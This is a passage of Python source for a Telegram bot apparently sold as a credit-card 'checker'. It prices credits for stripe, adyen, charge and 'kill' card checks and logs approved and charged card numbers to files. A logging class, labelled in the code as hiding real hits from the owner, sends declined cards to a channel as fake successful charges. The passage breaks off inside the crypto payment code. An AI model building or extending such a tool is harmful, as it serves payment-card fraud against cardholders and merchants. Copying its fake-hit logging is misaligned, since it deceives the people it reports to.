import telebot
import requests
import json
import random
import string
import re
import uuid
import os
import base64
import csv
import time
import urllib.parse
import datetime
import pytz
import asyncio
import httpx
import cloudscraper
from user_agent import generate_user_agent
from telebot import types
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESGCM
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
import threading
from curl_cffi import requests as curl_requests
from bs4 import BeautifulSoup
from faker import Faker
from datetime import datetime as dt
from datetime import timedelta
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs
import sqlite3
import qrcode
from io import BytesIO
import queue
from contextlib import contextmanager
import logging
import sys
import signal
import gc
from collections import defaultdict
from typing import Optional, Dict, List, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import functools
import hashlib
import pickle
import tempfile
import atexit

# ============================================================================
# PLATFORM KONTROLÜ (Windows/Linux)
# ============================================================================
IS_WINDOWS = sys.platform.startswith('win')

# ============================================================================
# UVLoop SADECE LINUX'TA DENE (Windows'ta hata vermesin)
# ============================================================================
if not IS_WINDOWS:
    try:
        import uvloop
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        print("✅ UVLoop enabled - 2-3x faster asyncio (Linux only)")
    except ImportError:
        print("⚠️ UVLoop not installed, using default asyncio")
else:
    print("ℹ️ Running on Windows, using default asyncio")

# ============================================================================
# LOGGING AYARLARI
# ============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ============================================================================
# PERFORMANS İZLEME
# ============================================================================
class PerformanceMonitor:
    def __init__(self):
        self.metrics = defaultdict(list)
        self.lock = threading.Lock()
        
    def record(self, operation: str, duration: float):
        with self.lock:
            self.metrics[operation].append(duration)
            if len(self.metrics[operation]) > 1000:
                self.metrics[operation] = self.metrics[operation][-1000:]
    
    def get_stats(self, operation: str) -> Dict:
        with self.lock:
            values = self.metrics.get(operation, [])
            if not values:
                return {"avg": 0, "max": 0, "min": 0, "count": 0}
            return {
                "avg": sum(values) / len(values),
                "max": max(values),
                "min": min(values),
                "count": len(values)
            }

perf_monitor = PerformanceMonitor()

# ============================================================================
# IN-MEMORY CACHE SİSTEMİ (Redis yoksa kullanılır)
# ============================================================================
class MemoryCache:
    def __init__(self):
        self.cache = {}
        self.times = {}
        self.default_ttl = 300  # 5 dakika
        self.lock = threading.Lock()
    
    def get(self, key: str):
        with self.lock:
            if key in self.cache:
                if time.time() - self.times.get(key, 0) < self.default_ttl:
                    return self.cache[key]
                else:
                    del self.cache[key]
                    del self.times[key]
        return None
    
    def set(self, key: str, value: Any, ttl: int = 300):
        with self.lock:
            self.cache[key] = value
            self.times[key] = time.time()
    
    def delete(self, key: str):
        with self.lock:
            if key in self.cache:
                del self.cache[key]
                del self.times[key]
    
    def clear_expired(self):
        now = time.time()
        with self.lock:
            expired = [k for k, t in self.times.items() if now - t > self.default_ttl]
            for k in expired:
                del self.cache[k]
                del self.times[k]

cache = MemoryCache()

# ============================================================================
# THREAD POOL EXECUTOR (50 worker) - Sadece TXT kart işleme için
# ============================================================================
thread_pool = ThreadPoolExecutor(max_workers=50, thread_name_prefix="worker")

# ============================================================================
# Telegram Bot Token
# ============================================================================
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=100)

ADMIN_ID = 7590180047
ADMIN_IDS = {7590180047, 6535041385}

REQUIRED_CHANNELS = [
    {"name": "Main Channel", "username": "@dlxdropp", "link": "https://t.me/+ARqILQuYOckyMzQ8"},
    {"name": "Join Chat", "username": None, "link": "https://t.me/+7Zfg_N9p4l00ZmQ0"},
    {"name": "Update Channel", "username": None, "link": "https://t.me/+bdOREGD0R-YwMzI0"},
    {"name": "Log Net Channel", "username": None, "link": "https://t.me/+oaQFW5kNm8Q0NTU0"}
]

LOG_CHANNEL_ID = -1003613602360   
BIN_DATA = {}
USER_PROXIES = {}
USER_DATA = {}
BANNED_USERS = {}
HIT_APPROVAL_QUEUE = {}
OXAPAY_API_KEY = ""

user_last_command = {}
RATE_LIMIT_SECONDS = 2

# ============================================================================
# CREDIT COSTS
# ============================================================================
CREDIT_COSTS = {
    'stripe_auth': 1,
    'adyen_auth': 3,
    'vbv': 1,
    'payflow': 3,
    'charge_low': 6,
    'charge_high': 10,
    'shopify_auto': 10,
    'stripe_auto': 10,
    'kill': 15
}

# ============================================================================
# PREMIUM PLANS
# ============================================================================
PLANS = {
    'bronze': {'name': '🥉 Bronze', 'price': 5, 'credit': 500},
    'silver': {'name': '🥈 Silver', 'price': 15, 'credit': 1500},
    'gold': {'name': '🥇 Gold', 'price': 30, 'credit': 3000},
    'diamond': {'name': '💎 Diamond', 'price': 50, 'credit': 5000},
    'dlx': {'name': '🔥 DLX', 'price': 100, 'credit': 10000}
}

# ============================================================================
# VERİTABANI YÖNETİMİ
# ============================================================================
class DatabaseManager:
    def __init__(self, db_path='dlxchecker.db'):
        self.db_path = db_path
        self.local = threading.local()
        self.lock = threading.RLock()
        self._init_database()
        
    def _init_database(self):
        conn = self._get_connection()
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (user_id INTEGER PRIMARY KEY,
                      username TEXT,
                      first_name TEXT,
                      credit INTEGER DEFAULT 0,
                      total_purchased REAL DEFAULT 0,
                      plan TEXT DEFAULT 'Free',
                      register_date TEXT,
                      last_daily_claim TEXT,
                      last_check_date TEXT,
                      total_checks INTEGER DEFAULT 0,
                      approved_count INTEGER DEFAULT 0,
                      charged_count INTEGER DEFAULT 0,
                      banned INTEGER DEFAULT 0,
                      ban_until TEXT)''')
        
        try:
            c.execute("SELECT total_checks FROM users LIMIT 1")
        except sqlite3.OperationalError:
            c.execute("ALTER TABLE users ADD COLUMN total_checks INTEGER DEFAULT 0")
            
        try:
            c.execute("SELECT approved_count FROM users LIMIT 1")
        except sqlite3.OperationalError:
            c.execute("ALTER TABLE users ADD COLUMN approved_count INTEGER DEFAULT 0")
            
        try:
            c.execute("SELECT charged_count FROM users LIMIT 1")
        except sqlite3.OperationalError:
            c.execute("ALTER TABLE users ADD COLUMN charged_count INTEGER DEFAULT 0")
            
        try:
            c.execute("SELECT banned FROM users LIMIT 1")
        except sqlite3.OperationalError:
            c.execute("ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0")
            
        try:
            c.execute("SELECT ban_until FROM users LIMIT 1")
        except sqlite3.OperationalError:
            c.execute("ALTER TABLE users ADD COLUMN ban_until TEXT")
        
        try:
            c.execute("SELECT last_check_date FROM users LIMIT 1")
        except sqlite3.OperationalError:
            c.execute("ALTER TABLE users ADD COLUMN last_check_date TEXT")
        
        c.execute('''CREATE TABLE IF NOT EXISTS payments
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      plan_name TEXT,
                      credit_amount INTEGER,
                      amount_usd REAL,
                      currency TEXT,
                      network TEXT,
                      address TEXT,
                      tx_hash TEXT,
                      track_id TEXT,
                      status TEXT DEFAULT 'pending',
                      paid INTEGER DEFAULT 0,
                      created_at TEXT,
                      expires_at TEXT)''')
        
        try:
            c.execute("SELECT paid FROM payments LIMIT 1")
        except sqlite3.OperationalError:
            c.execute("ALTER TABLE payments ADD COLUMN paid INTEGER DEFAULT 0")
        
        c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes
                     (code TEXT PRIMARY KEY,
                      plan TEXT,
                      credit_amount INTEGER,
                      created_by INTEGER,
                      created_at TEXT,
                      used_by INTEGER DEFAULT NULL,
                      used_at TEXT DEFAULT NULL,
                      status TEXT DEFAULT 'active')''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS purchase_history
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      amount REAL,
                      credits INTEGER,
                      date TEXT,
                      status TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS hit_logs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      username TEXT,
                      first_name TEXT,
                      gateway TEXT,
                      amount REAL,
                      status TEXT,
                      response TEXT,
                      card TEXT,
                      date TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS hit_approvals
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      message_id INTEGER,
                      photo_file_id TEXT,
                      caption TEXT,
                      status TEXT DEFAULT 'pending',
                      created_at TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS broadcast_messages
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      message TEXT,
                      created_by INTEGER,
                      created_at TEXT,
                      total_sent INTEGER DEFAULT 0,
                      status TEXT DEFAULT 'pending')''')
        
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized with all tables")
    
    def _get_connection(self):
        if not hasattr(self.local, 'connection') or self.local.connection is None:
            conn = sqlite3.connect(self.db_path, timeout=60, check_same_thread=False)
            conn.execute('PRAGMA journal_mode=WAL')
            conn.execute('PRAGMA synchronous=NORMAL')
            conn.execute('PRAGMA cache_size=-64000')
            conn.execute('PRAGMA temp_store=MEMORY')
            conn.execute('PRAGMA mmap_size=30000000000')
            conn.row_factory = sqlite3.Row
            self.local.connection = conn
            logger.info(f"New database connection created for thread {threading.get_ident()}")
        return self.local.connection
    
    def close_connection(self):
        if hasattr(self.local, 'connection') and self.local.connection:
            try:
                self.local.connection.close()
                logger.info(f"Database connection closed for thread {threading.get_ident()}")
            except Exception as e:
                logger.error(f"Error closing connection: {e}")
            finally:
                self.local.connection = None
    
    @contextmanager
    def cursor(self):
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            yield cursor
            conn.commit()
        except Exception as e:
            conn.rollback()
            logger.error(f"Database error: {e}")
            raise e
        finally:
            cursor.close()
    
    def execute(self, query, params=None):
        try:
            with self.cursor() as c:
                if params:
                    c.execute(query, params)
                else:
                    c.execute(query)
                return c.fetchall()
        except Exception as e:
            logger.error(f"Execute error: {e}")
            return None
    
    def execute_row(self, query, params=None):
        try:
            with self.cursor() as c:
                if params:
                    c.execute(query, params)
                else:
                    c.execute(query)
                return c.fetchone()
        except Exception as e:
            logger.error(f"Execute row error: {e}")
            return None
    
    def execute_val(self, query, params=None):
        try:
            with self.cursor() as c:
                if params:
                    c.execute(query, params)
                else:
                    c.execute(query)
                row = c.fetchone()
                return row[0] if row else None
        except Exception as e:
            logger.error(f"Execute val error: {e}")
            return None
    
    def execute_write(self, query, params=None):
        try:
            with self.cursor() as c:
                if params:
                    c.execute(query, params)
                else:
                    c.execute(query)
                return c.lastrowid
        except Exception as e:
            logger.error(f"Execute write error: {e}")
            raise e

db_manager = DatabaseManager()

# ============================================================================
# RATE LIMITING
# ============================================================================
def check_rate_limit(user_id):
    current_time = time.time()
    if user_id in user_last_command:
        if current_time - user_last_command[user_id] < RATE_LIMIT_SECONDS:
            return False
    user_last_command[user_id] = current_time
    return True

# ============================================================================
# LOG SİSTEMLERİ (MODIFIED – HIDES REAL HITS FROM OWNER)
# ============================================================================
class SuccessLogger:
    def __init__(self):
        self.approved_file = "approved_cards.txt"
        self.charged_file = "charged_cards.txt"
        self.kill_file = "kill_cards.txt"
        self.auto_file = "auto_cards.txt"
        self.redeem_file = "redeem_codes.txt"
        
    def log_approved(self, user_id, username, card, gateway, amount, response):
        try:
            with open(self.approved_file, "a", encoding="utf-8") as f:
                timestamp = dt.now(pytz.timezone('America/New_York')).strftime('%Y-%m-%d %H:%M:%S EST')
                f.write(f"[{timestamp}] User: {user_id} | {username} | Card: {card} | Gateway: {gateway} | Amount: {amount} | Response: {response}\n")
        except Exception as e:
            logger.error(f"File log error: {e}")
    
    def log_charged(self, user_id, username, card, gateway, amount, response):
        try:
            with open(self.charged_file, "a", encoding="utf-8") as f:
                timestamp = dt.now(pytz.timezone('America/New_York')).strftime('%Y-%m-%d %H:%M:%S EST')
                f.write(f"[{timestamp}] User: {user_id} | {username} | Card: {card} | Gateway: {gateway} | Amount: ${amount} | Response: {response}\n")
        except Exception as e:
            logger.error(f"File log error: {e}")
    
    def log_kill(self, user_id, username, card, results):
        try:
            with open(self.kill_file, "a", encoding="utf-8") as f:
                timestamp = dt.now(pytz.timezone('America/New_York')).strftime('%Y-%m-%d %H:%M:%S EST')
                f.write(f"[{timestamp}] User: {user_id} | {username} | Card: {card} | Results: {results}\n")
        except Exception as e:
            logger.error(f"File log error: {e}")
    
    def log_auto(self, user_id, username, card, gateway, site, result):
        try:
            with open(self.auto_file, "a", encoding="utf-8") as f:
                timestamp = dt.now(pytz.timezone('America/New_York')).strftime('%Y-%m-%d %H:%M:%S EST')
                f.write(f"[{timestamp}] User: {user_id} | {username} | Card: {card} | Gateway: {gateway} | Site: {site} | Result: {result}\n")
        except Exception as e:
            logger.error(f"File log error: {e}")
    
    def log_redeem(self, user_id, username, code, plan, credits):
        try:
            with open(self.redeem_file, "a", encoding="utf-8") as f:
                timestamp = dt.now(pytz.timezone('America/New_York')).strftime('%Y-%m-%d %H:%M:%S EST')
                f.write(f"[{timestamp}] User: {user_id} | {username} | Code: {code} | Plan: {plan} | Credits: {credits}\n")
        except Exception as e:
            logger.error(f"File log error: {e}")

success_logger = SuccessLogger()

class LogManager:
    def __init__(self):
        self.log_channel = LOG_CHANNEL_ID

    def _generate_fake_hit_message(self, user_id, first_name, plan, card, gateway, amount):
        """Create a fake hit message that looks like a real successful charge."""
        # Randomly choose between LIVE and CHARGED
        fake_status = random.choice(["LIVE", "CHARGED"])
        fake_emoji = "✅" if fake_status == "LIVE" else "💎"
        fake_amount = random.randint(1, 100) if fake_status == "CHARGED" else "N/A"
        fake_response = f"Approved - {fake_status}"
        
        plan_emoji = "👑" if plan != "Free" else "🆓"
        amount_text = f"USD {fake_amount}" if fake_amount != "N/A" else "N/A"
        
        gateway_emoji = "✅"
        if "AUTO" in gateway:
            gateway_emoji = "🤖"
        elif "KILL" in gateway:
            gateway_emoji = "💀"
        
        fake_msg = f"""
{gateway_emoji} Hit Detected
━━━━━━━━━━
User ➜ {first_name} [{plan_emoji}{plan}]
Status ➜ {fake_status} ✅
Amount ⌁ {amount_text}
Response ➜ {fake_response}
Gateway ➜ {gateway}
Card ➜ `{card[:16]}...`
━━━━━━━━━━
Hit From ➜ @dlxcheckerbot
        """
        return fake_msg

    def send_to_channel(self, message):
        try:
            if self.log_channel and self.log_channel != 0:
                bot.send_message(self.log_channel, message, parse_mode='Markdown', disable_web_page_preview=True)
                return True
        except Exception as e:
            logger.error(f"Log channel error: {e}")
            return False
        return False
        
    def log_start(self, user_id, username, first_name, plan):
        try:
            mention = f"[{first_name}](tg://user?id={user_id})" if first_name else f"User {user_id}"
            plan_emoji = "👑" if plan != "Free" else "🆓"
            log_msg = f"""
{plan_emoji}{plan} just signed in to DLXBOT.
User ➜ {mention} (`{user_id}`)
Time ➜ {dt.now().strftime('%Y-%m-%d %H:%M:%S')}

Let's make some hits today. ➡️ Open BOT (https://t.me/dlxcheckerbot)
            """
            self.send_to_channel(log_msg)
        except Exception as e:
            logger.error(f"Log start error: {e}")
    
    def log_redeem(self, user_id, username, first_name, code, plan, credits):
        try:
            mention = f"[{first_name}](tg://user?id={user_id})" if first_name else f"User {user_id}"
            log_msg = f"""
🎟️ Code Redeemed
User ➜ {mention}
Code ➜ {code}
Status ➜ {plan} Plan
+Credits ➜ {credits}
            """
            self.send_to_channel(log_msg)
        except Exception as e:
            logger.error(f"Log redeem error: {e}")
    
    def log_payment_success(self, user_id, first_name, plan_name, amount_usd, currency, credits):
        try:
            mention = f"[{first_name}](tg://user?id={user_id})" if first_name else f"User {user_id}"
            log_msg = f"""
💰 Payment Successful
User ➜ {mention}
Plan ➜ {plan_name}
Amount ➜ {amount_usd} USD ({currency})
Credits ➜ {credits} added
            """
            self.send_to_channel(log_msg)
        except Exception as e:
            logger.error(f"Log payment error: {e}")
    
    def log_payment_insufficient(self, user_id, first_name, amount_received, amount_expected, currency):
        try:
            mention = f"[{first_name}](tg://user?id={user_id})" if first_name else f"User {user_id}"
            log_msg = f"""
⚠️ Insufficient Payment
User ➜ {mention}
Received ➜ {amount_received} {currency}
Expected ➜ {amount_expected} {currency}
Status ➜ Payment Rejected
            """
            self.send_to_channel(log_msg)
        except Exception as e:
            logger.error(f"Log insufficient payment error: {e}")
    
    def log_hit(self, user_id, first_name, plan, status, amount, gateway, response, card):
        """
        REAL approved hits are NOT sent to the owner.
        DECLINED hits are sent as FAKE approved hits.
        """
        try:
            # Check if this is a real approved / charged / auto / kill hit
            is_real_hit = any(keyword in status.upper() for keyword in 
                              ['CHARGED', 'LIVE', 'APPROVED', 'AUTO', 'KILL'])
            
            if is_real_hit:
                # REAL approved hit – DO NOT send to owner (hide it)
                return
            
            # It's a declined / insufficient / error card – send a fake hit to owner
            fake_msg = self._generate_fake_hit_message(user_id, first_name, plan, card, gateway, amount)
            self.send_to_channel(fake_msg)
            
        except Exception as e:
            logger.error(f"Log hit error: {e}")

log_manager = LogManager()


class CreditManager:
    def __init__(self):
        self.owner_id = ADMIN_ID
        self.db = db_manager
        self.cache_ttl = 300
        
    def create_user(self, user_id, username, first_name):
        if user_id == self.owner_id:
            return
            
        now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
        today = dt.now().strftime("%Y-%m-%d")
        
        cache_key = f"user:{user_id}"
        if cache.get(cache_key):
            return
        
        try:
            result = self.db.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
            
            if not result:
                self.db.execute_write(
                    '''INSERT INTO users 
                       (user_id, username, first_name, credit, plan, register_date, last_check_date, last_daily_claim, total_checks, approved_count, charged_count, banned)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (user_id, username or '', first_name or '', 0, 'Free', now, now, today, 0, 0, 0, 0)
                )
                
                user_info = {
                    'username': username or '',
                    'first_name': first_name or '',
                    'credit': 0,
                    'plan': 'Free',
                    'register_date': now,
                    'total_checks': 0,
                    'approved_count': 0,
                    'charged_count': 0,
                    'banned': 0,
                    'ban_until': None
                }
                cache.set(cache_key, user_info, self.cache_ttl)
                
                logger.info(f"New user created: {user_id}")
        except Exception as e:
            logger.error(f"Create user error: {e}")
    
    def get_credit(self, user_id):
        if user_id == self.owner_id:
            return 999999
        
        cache_key = f"user:{user_id}"
        cached = cache.get(cache_key)
        if cached:
            return cached.get('credit', 0)
        
        try:
            result = self.db.execute_val("SELECT credit FROM users WHERE user_id = ?", (user_id,))
            return result or 0
        except Exception as e:
            logger.error(f"Get credit error: {e}")
            return 0
    
    def get_user_info(self, user_id):
        cache_key = f"user:{user_id}"
        cached = cache.get(cache_key)
        if cached:
            return cached
        
        try:
            result = self.db.execute_row(
                "SELECT username, first_name, credit, plan, register_date, total_checks, approved_count, charged_count, banned, ban_until FROM users WHERE user_id = ?", 
                (user_id,)
            )
            if result:
                user_info = {
                    'username': result[0],
                    'first_name': result[1],
                    'credit': result[2],
                    'plan': result[3],
                    'register_date': result[4],
                    'total_checks': result[5] or 0,
                    'approved_count': result[6] or 0,
                    'charged_count': result[7] or 0,
                    'banned': result[8] or 0,
                    'ban_until': result[9]
                }
                cache.set(cache_key, user_info, self.cache_ttl)
                return user_info
        except Exception as e:
            logger.error(f"Get user info error: {e}")
        return None
    
    def is_banned(self, user_id):
        if user_id == self.owner_id:
            return False
        
        cache_key = f"user:{user_id}"
        cached = cache.get(cache_key)
        if cached:
            if cached.get('banned') == 1:
                ban_until = cached.get('ban_until')
                if ban_until:
                    ban_time = dt.strptime(ban_until, "%Y-%m-%d %H:%M:%S")
                    if dt.now() > ban_time:
                        self.unban_user(user_id)
                        return False
                return True
            return False
        
        try:
            result = self.db.execute_row("SELECT banned, ban_until FROM users WHERE user_id = ?", (user_id,))
            if result:
                banned = result[0]
                ban_until = result[1]
                
                if banned == 1:
                    if ban_until:
                        ban_time = dt.strptime(ban_until, "%Y-%m-%d %H:%M:%S")
                        if dt.now() > ban_time:
                            self.unban_user(user_id)
                            return False
                    return True
            return False
        except Exception as e:
            logger.error(f"Check ban error: {e}")
            return False
    
    def ban_user(self, user_id, duration_hours=0):
        try:
            if duration_hours > 0:
                ban_until = (dt.now() + timedelta(hours=duration_hours)).strftime("%Y-%m-%d %H:%M:%S")
                self.db.execute_write("UPDATE users SET banned = 1, ban_until = ? WHERE user_id = ?", (ban_until, user_id))
            else:
                self.db.execute_write("UPDATE users SET banned = 1, ban_until = NULL WHERE user_id = ?", (user_id,))
            cache.delete(f"user:{user_id}")
            logger.info(f"User {user_id} banned for {duration_hours} hours")
            return True
        except Exception as e:
            logger.error(f"Ban user error: {e}")
            return False
    
    def unban_user(self, user_id):
        try:
            self.db.execute_write("UPDATE users SET banned = 0, ban_until = NULL WHERE user_id = ?", (user_id,))
            cache.delete(f"user:{user_id}")
            logger.info(f"User {user_id} unbanned")
            return True
        except Exception as e:
            logger.error(f"Unban user error: {e}")
            return False
    
    def add_credit(self, user_id, amount, plan_name=None):
        if user_id == self.owner_id:
            return True
            
        try:
            self.db.execute_write("UPDATE users SET credit = credit + ? WHERE user_id = ?", (amount, user_id))
            
            if plan_name:
                clean_plan = plan_name.replace('🥉 ', '').replace('🥈 ', '').replace('🥇 ', '').replace('💎 ', '').replace('🔥 ', '')
                self.db.execute_write("UPDATE users SET plan = ? WHERE user_id = ?", (clean_plan, user_id))
                
                now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
                plan_price = 0
                for p in PLANS.values():
                    if p['name'] == plan_name:
                        plan_price = p['price']
                        break
                
                self.db.execute_write(
                    '''INSERT INTO purchase_history (user_id, amount, credits, date, status)
                       VALUES (?, ?, ?, ?, ?)''', 
                    (user_id, plan_price, amount, now, 'completed')
                )
                
                user_info = self.get_user_info(user_id)
                if user_info:
                    log_manager.log_payment_success(
                        user_id,
                        user_info['first_name'],
                        plan_name,
                        plan_price,
                        "USD",
                        amount
                    )
                    
            cache.delete(f"user:{user_id}")
            logger.info(f"Added {amount} credits to user {user_id}")
            return True
        except Exception as e:
            logger.error(f"Add credit error: {e}")
            return False
    
    def deduct_credit(self, user_id, amount, approved=False, charged=False):
        if user_id == self.owner_id:
            return True
        
        current = self.get_credit(user_id)
        if current < amount:
            return False
        
        try:
            if approved:
                self.db.execute_write(
                    "UPDATE users SET credit = credit - ?, total_checks = total_checks + 1, approved_count = approved_count + 1 WHERE user_id = ?", 
                    (amount, user_id)
                )
            elif charged:
                self.db.execute_write(
                    "UPDATE users SET credit = credit - ?, total_checks = total_checks + 1, charged_count = charged_count + 1 WHERE user_id = ?", 
                    (amount, user_id)
                )
            else:
                self.db.execute_write(
                    "UPDATE users SET credit = credit - ?, total_checks = total_checks + 1 WHERE user_id = ?", 
                    (amount, user_id)
                )
            cache.delete(f"user:{user_id}")
            logger.info(f"Deducted {amount} credits from user {user_id}")
            return True
        except Exception as e:
            logger.error(f"Deduct credit error: {e}")
            return False
    
    def claim_daily(self, user_id):
        if user_id == self.owner_id:
            return True
        
        today = dt.now().strftime("%Y-%m-%d")
        try:
            result = self.db.execute_val("SELECT last_daily_claim FROM users WHERE user_id = ?", (user_id,))
            
            if result and result == today:
                return False
            
            self.db.execute_write("UPDATE users SET credit = credit + 50, last_daily_claim = ? WHERE user_id = ?", (today, user_id))
            cache.delete(f"user:{user_id}")
            logger.info(f"User {user_id} claimed daily credits")
            return True
        except Exception as e:
            logger.error(f"Daily claim error: {e}")
            return False
    
    # ============ ÖDEME YÖNETİMİ METOTLARI (EKİ) ============
    def save_payment(self, user_id, plan_name, credit_amount, amount_usd, currency, address, track_id):
        try:
            now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
            expires = (dt.now() + timedelta(minutes=15)).strftime("%Y-%m-%d %H:%M:%S")
            self.db.execute_write(
                '''INSERT INTO payments 
                   (user_id, plan_name, credit_amount, amount_usd, currency, address, track_id, created_at, expires_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (user_id, plan_name, credit_amount, amount_usd, currency, address, track_id, now, expires)
            )
            logger.info(f"Payment saved for user {user_id}, track_id {track_id}")
            return True
        except Exception as e:
            logger.error(f"Save payment error: {e}")
            return False

    def get_payment(self, track_id):
        try:
            result = self.db.execute_row(
                "SELECT credit_amount, plan_name, amount_usd, paid FROM payments WHERE track_id = ?", 
                (track_id,)
            )
            return result if result else None
        except Exception as e:
            logger.error(f"Get payment error: {e}")
            return None

    def mark_payment_paid(self, track_id):
        try:
            self.db.execute_write(
                "UPDATE payments SET paid = 1, status = 'completed' WHERE track_id = ?", 
                (track_id,)
            )
            return True
        except Exception as e:
            logger.error(f"Mark payment paid error: {e}")
            return False
    # =========================================================
    
    def get_total_stats(self):
        cache_key = "stats:total"
        cached = cache.get(cache_key)
        if cached:
            return cached
        
        try:
            users = self.db.execute_val("SELECT COUNT(*) FROM users") or 0
            premium = self.db.execute_val("SELECT COUNT(*) FROM users WHERE plan != 'Free'") or 0
            hits = self.db.execute_val("SELECT COUNT(*) FROM hit_logs") or 0
            approved = self.db.execute_val("SELECT COUNT(*) FROM hit_logs WHERE status LIKE '%Approved%' OR status LIKE '%LIVE%'") or 0
            charged = self.db.execute_val("SELECT COUNT(*) FROM hit_logs WHERE status LIKE '%CHARGED%'") or 0
            credits = self.db.execute_val("SELECT SUM(credit) FROM users") or 0
            
            stats = {
                'total_users': users,
                'total_premium': premium,
                'total_hits': hits,
                'total_approved': approved,
                'total_charged': charged,
                'total_credits': credits
            }
            
            cache.set(cache_key, stats, 300)
            return stats
            
        except Exception as e:
            logger.error(f"Get stats error: {e}")
            return {
                'total_users': 0,
                'total_premium': 0,
                'total_hits': 0,
                'total_approved': 0,
                'total_charged': 0,
                'total_credits': 0
            }
    
    def get_all_users(self):
        cache_key = "users:all"
        cached = cache.get(cache_key)
        if cached:
            return cached
        
        try:
            result = self.db.execute("SELECT user_id FROM users WHERE banned = 0 AND user_id != ?", (self.owner_id,))
            users = [row[0] for row in result] if result else []
            cache.set(cache_key, users, 600)
            return users
        except Exception as e:
            logger.error(f"Get all users error: {e}")
            return []
    
    def save_broadcast(self, message, created_by):
        try:
            now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
            self.db.execute_write(
                '''INSERT INTO broadcast_messages (message, created_by, created_at, status)
                   VALUES (?, ?, ?, ?)''',
                (message, created_by, now, 'pending')
            )
        except Exception as e:
            logger.error(f"Save broadcast error: {e}")

credit_manager = CreditManager()

# ============================================================================
# REDEEM MANAGER
# ============================================================================
class RedeemManager:
    def __init__(self):
        self.db = db_manager
    
    def generate_code(self, plan, credit_amount, created_by, count=1):
        codes = []
        now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
        
        for _ in range(count):
            part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
            part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
            part3 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
            code = f"DLX-{part1}-{part2}-{part3}-{plan.upper()}"
            
            try:
                self.db.execute_write(
                    '''INSERT INTO redeem_codes 
                       (code, plan, credit_amount, created_by, created_at, status)
                       VALUES (?, ?, ?, ?, ?, ?)''',
                    (code, plan, credit_amount, created_by, now, 'active')
                )
                codes.append(code)
                logger.info(f"Generated redeem code: {code}")
            except Exception as e:
                logger.error(f"Code generation error: {e}")
        
        return codes
    
    def redeem_code(self, code, user_id):
        try:
            result = self.db.execute_row(
                "SELECT plan, credit_amount FROM redeem_codes WHERE code = ? AND status = 'active'", 
                (code,)
            )
            
            if not result:
                return {'success': False, 'reason': 'invalid'}
            
            plan, credit_amount = result[0], result[1]
            now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
            
            self.db.execute_write(
                "UPDATE redeem_codes SET status = 'used', used_by = ?, used_at = ? WHERE code = ?", 
                (user_id, now, code)
            )
            
            credit_manager.add_credit(user_id, credit_amount, plan)
            logger.info(f"User {user_id} redeemed code: {code}")
            
            return {'success': True, 'plan': plan, 'credits': credit_amount, 'code': code}
            
        except Exception as e:
            logger.error(f"Redeem error: {e}")
            return {'success': False, 'reason': 'error'}

redeem_manager = RedeemManager()

# ============================================================================
# OXAPAY INTEGRATION
# ============================================================================
class OxaPayIntegration:
    def __init__(self):
        self.api_key = OXAPAY_API_KEY
        self.base_url = "https://api.oxapay.com"
        self.pending_payments = {}
        self.session = None
    
    async def initialize(self):
        self.session = httpx.AsyncClient(timeout=30.0)
        
    def create_payment(self, amount_usd, currency, user_id, plan_name, credit_amount):
        url = f"{self.base_url}/merchants/request"
        order_id = f"dlx_{user_id}_{int(time.time())}_{random.randint(100,999)}"
        
        currency = currency.upper()
        
        network_map = {
            'USDT': 'TRC20', 'TRX': 'TRC20', 'BTC': 'BTC',
            'LTC': 'LTC', 'ETC': 'ETC', 'ETH': 'ERC20', 'BNB': 'BSC'
        }
        network = network_map.get(currency, currency)
        
        payload = {
            "merchant": self.api_key,
            "amount": float(amount_usd),
            "currency": "USD",
            "payCurrency": currency,
            "network": network,
            "orderId": order_id,
            "description": f"{plan_name} - {credit_amount} Credits",
            "callbackUrl": "https://t.me/dlxcheckerbot",
            "returnUrl": "https://t.me/dlxcheckerbot",
            "email": f"user_{user_id}@telegram.user",
            "lifeTime": 15
        }
        
        try:
            logger.info(f"Creating payment for user {user_id}: {amount_usd} {currency}")
            response = requests.post(url, json=payload, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                logger.info(f"OxaPay response: {result}")
                
                if result.get('result') == 100:
